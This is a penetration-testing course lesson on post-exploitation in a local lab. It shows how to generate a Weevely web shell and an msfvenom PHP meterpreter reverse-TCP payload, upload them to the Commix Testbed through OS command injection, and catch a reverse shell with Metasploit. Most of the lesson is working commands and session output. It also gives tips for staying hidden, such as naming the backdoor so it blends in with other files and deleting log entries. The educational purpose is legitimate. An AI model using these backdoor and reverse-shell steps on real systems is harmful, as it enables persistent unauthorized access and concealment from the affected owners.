Now that we’ve performed automated and manual attacks, it’s time to take it a step further. In this lesson, we’re going to generate backdoor shells and plant them on the target host in order to persist access for as long as possible. This is known as the post-exploitation phase, which focuses on identifying the value of our target as well as extending and elevating our access.

That way, you can continue accessing your target as many times and for as long as you want, assuming that you don’t get detected. 

If performing a pentest for a client, this can also be a good way to see how far you can take the exploit, and it can be used to demonstrate how critical the vulnerability is.

## Techniques and tools
For this lesson, we’re going to use two techniques that rely on two different tools:

1. Upload a Weevely PHP web shell
2. Upload a metasploit PHP meterpreter shell

[Weevely](https://github.com/epinna/weevely3) is a very lightweight and simple approach, while [Metasploit](https://www.metasploit.com/) ([Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)) is an entire framework that offers a lot of variety and powerful tools. 

Both of these techniques will end up giving us similar results in this lesson, they’re just two different approaches.

We’ll start with the Weevely approach since it’s a bit more straight forward. Weevely is a weaponized web shell, meaning that it is designed to be used once a system has been compromised.

## Concept of Backdoors
So with our prior examples, we compromised the DVWA and the Commix Testbed systems after finding out that they were vulnerable to OS Command Injections. But, having to exploit an application through endpoints or by running attacks manually or with automated tools not only limits us, but it can trigger red flags and leave a lot of footprints behind.

Instead, the ideal solution would be to create a backdoor that lets us exploit our target whenever we need, and without having to exploit it through those endpoints vulnerable endpoints. Essentially, we’re figuratively creating a “back door” into the server that no one else knows about and that we can use whenever we want to establish a shell connection. 

And if we can find a way to elevate our privileges, we could even completely wipe out all of our traces by deleting those entries from system logs. We could look for system or application credentials, and we could try to move laterally, meaning that we move through our target’s systems, networks, and environments.

This is a massive set of topics by itself and it’s outside the scope of this course, but keep in mind that this can escalate to more advanced techniques very rapidly. 

## Creating and Exploiting Backdoors with Weevely
Make sure you have your Commix Testbed environment up and running:

```systemctl start dockerdocker run --rm -it -d -p 3000:80 cybrcom/commix-testbed```

Then, I’ll move to my Documents directory:

```cd ~/Documents```

### Generating the payload
Once there, let’s generate our Weevely payload:

```weevely generate commix weevely.php```

More information: [https://github.com/commixproject/commix/wiki/Upload-shells](https://github.com/commixproject/commix/wiki/Upload-shells).

It will create a weevely.php file in our current directory with the password commix. To view the contents, we can type:

```cat weevely.php```

As you can see, the code is obfuscated through encryption, but this code is what creates our backdoor. The creators of Weevely call this the backdoor agent, and this is the file that we want to upload to the target web folder. Once it’s uploaded to the target web folder, we will have the web server execute that PHP code which is what gives us remote access. So, the agent has to be reachable from a URL you have access to, otherwise this won’t work.

### Uploading our Weevely backdoor
In order to upload it, we have to go back to using Commix. But before I do that, I’m going to cheat a little bit because our upload attempt will actually fail at first, and I want to show you why. Let’s jump inside of the container:

```docker ps```

Grab the container ID and use it for this command:

```docker exec -it <id> /bin/bash```

Now let’s pull up the apache error logs to monitor what happens.

```tail -f /var/log/apache2/error.log```

Now let’s go back to Commix and run our attack:

```python commix.py --url="http://127.0.0.1:3000/commix-testbed/scenarios/regular/GET/classic.php?addr=INJECT_HERE" --file-upload="/home/kali/Documents/weevely.php" --file-dest="/var/www/example.com/public_html/commix-testbed/scenarios/regular/GET/"```

With this command, we are uploading the Weevely file to the target destination. 

It will ask if we want to enable an HTTP server to which we will respond Y. Then we get this warning:

```[warning] It seems that you don't have permissions to write the '/var/www/example.com/public_html/commix-testbed/scenarios/regular/GET/weevely.php' file.```

And the file did not write because our user running the application does not have proper permissions. This is because of how permissions have been set up on the server/container.

If we exit out of the error logs, and we run an ```ls -l```, we will see that the directory is owned by root. While I would not recommend having root own the web application directory, in this case it prevented us from uploading files via the command injection vulnerability, so that is something to keep in mind when we explore defenses later in the course! Permissions can play a role in preventing compromises, but they also should not be the only defense.

Let’s change these permissions so that we can demonstrate the file upload:

```chown -R www-data:www-data commix-testbed```

Now, let’s re-run our attack.

```python commix.py --url="http://127.0.0.1:3000/commix-testbed/scenarios/regular/GET/classic.php?addr=INJECT_HERE" --file-upload="/home/kali/Documents/weevely.php" --file-dest="/var/www/example.com/public_html/commix-testbed/scenarios/regular/GET/"```

And there you have it!

```[info] The /var/www/example.com/public_html/commix-testbed/scenarios/regular/GET/weevely.php file was uploaded successfully!```

We’ve uploaded our backdoor agent to the server, and we can verify with the Pseudo-terminal:

```ls weevely.php```

### Exploiting the Weevely backdoor
After uploading the backdoor agent, we can execute the script from Weevely back on our system.

```weevely http://127.0.0.1:3000//commix-testbed/scenarios/regular/GET/weevely.php commix```

As a reminder, the commix at the end is the password we used to encrypt this file.

We now have shell access to the server/container, and if this were not a lab environment, we could keep this access for as long as our victims don’t realize the backdoor is there.

Considering that this weevely.php file is just one of thousands of files on this system, depending on how sophisticated your target is, it could be that they never find this file. You could even change this to be a filename that blends in even more. For example, there are a bunch of files in here that start with ```classic_```, so you could name yours ```classic_advanced_auth.php``` and it would blend right in.

Alright, enough of me giving you bad ideas, let’s move on to our next tool and technique.

## Creating and exploiting backdoors with Meterpreter

For this approach, we’re going to use MSFvenom to generate our payload. MSFvenom is a combination of Msfpayload and MSfencode, and it replaced both of those tools back in 2015. So now, we can do this from one single tool. While we won’t spend much time on this tool and how it works, it’s definitely something to research further if you are interested.

### Generating our payload with MSFvenom
```msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -e php/base64 -f raw > ~/Documents/msfvenom.php```

- ```-p``` – the payload to use, in this case ```php/meterpreter/reverse_tcp```
- ```LHOST``` – represents the localhost IP to receive a back connection, which we can check with sudo ifconfig, looking at ```eth0```, which is ```10.0.2.15```
- ```LPORT``` – represents the local port on which the connection listens for the victim, which we set to ```4444```

If the target were on a different network, we’d have to use a different LHOST and LPORT and potentially do port forwarding, but that’s not the case here.

- ```-e``` represents the encoder to use, set to ```php/base64```
- ```-f``` is for format, which we set to ```raw```
- ```> ~/Documents/msfvenom.php``` – which outputs our payload file

Add ```<?php ?>``` in the file:

```
vim msfvenom.php
gg #shortcut to go to beginning of file
i #insert mode
esc #escape insert mode
$ #shortcut to go to end of line
a #shortcut to move cursor after current character
i
?>
esc:x #write changes and exit
```

### Starting our listener with Metasploit Meterpreter
Next, we’ll use metasploit to start our listener:

```
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 10.0.2.15
set LPORT 4444
exploit
```

At which point you should see:

```[*] Started reverse TCP handler on 10.0.2.15:4444 ```

### Delivering the payload with Commix
Now, it’s time to deliver our payload and watch the magic happen!

```python commix.py --url="http://127.0.0.1:3000/commix-testbed/scenarios/regular/GET/classic.php?addr=INJECT_HERE" --file-upload="/home/kali/Documents/msfvenom.php" --file-dest="/var/www/example.com/public_html/commix-testbed/scenarios/regular/GET/" --os-cmd="php -f /var/www/example.com/public_html/commix-testbed/scenarios/regular/GET/msfvenom.php"```

- ```php -f``` command tells PHP to parse and execute a file, in this case our payload

```Y``` for the HTTP server

```N``` if it asks you to continue where you left off

You should see this success info message:

```[info] The /var/www/example.com/public_html/commix-testbed/scenarios/regular/GET/msfvenom.php file was uploaded successfully!```

### Exploiting the Backdoor with Metasploit Meterpreter
You should also see a change in your metasploit window that indicates a successful connection, like this:

```[*] Started reverse TCP handler on 10.0.2.15:4444 [*] Sending stage (38288 bytes) to 172.17.0.2[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 172.17.0.2:52140) at 2020-09-14 15:27:48 -0400meterpreter >```

If you type ```pwd```, it should show the endpoint’s directory:

```/var/www/example.com/public_html/commix-testbed/scenarios/regular/GET```

Just like with Weevely, we now have a backdoor that gives us shell access any time we want it!

## Conclusion
We’ve now used a number of different approaches and techniques in order to exploit this OS Command Injection, and I hope that you’re convinced that this is definitely a threat to take very seriously.

Go ahead and have fun with these exploits and see what you can do, and then complete this lesson to move on to the next!






